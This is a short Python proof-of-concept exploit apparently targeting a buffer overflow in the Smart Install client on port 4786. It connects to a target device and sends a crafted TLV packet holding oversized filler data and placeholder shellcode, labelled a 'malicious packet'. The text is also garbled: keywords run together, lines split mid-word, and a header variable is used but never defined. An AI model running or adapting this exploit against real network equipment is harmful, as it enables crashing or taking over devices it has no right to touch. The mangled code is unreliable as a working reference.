#smi_ibc_init_discovery_BoF.py
importsocket
importstruct
fromoptparse import OptionParser
# Parsethe target options
parser =OptionParser()
parser.add_option("-t","--target", dest="target", help="Smart InstallClient", de
fault="192.168.1.1")parser.add_option("-p", "--port", dest="port",type="int", h
elp="Portof Client", default=4786) (options, args) = parser.parse_args()
defcraft_tlv(t, v, t_fmt='!I', l_fmt='!I'):
return struct.pack(t_fmt,t) + struct.pack(l_fmt, len(v)) + v
defsend_packet(sock, packet):
sock.send(packet)
defreceive(sock):
returnsock.recv()
if__name__ == "__main__":
print"[*] Connecting to Smart Install Client ", options.target,"port", optio
ns.port
con =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
con.connect((options.target,options.port))
payload= 'BBBB' * 44 shellcode = 'D' * 2048
data ='A' * 36 + struct.pack('!I', len(payload) + len(shellcode) + 40) + payl
oad
tlv_1 =craft_tlv(0x00000001, data) tlv_2 = shellcode
pkt =hdr + tlv_1 + tlv_2
print"[*] Send a malicious packet" send_packet(con, pkt)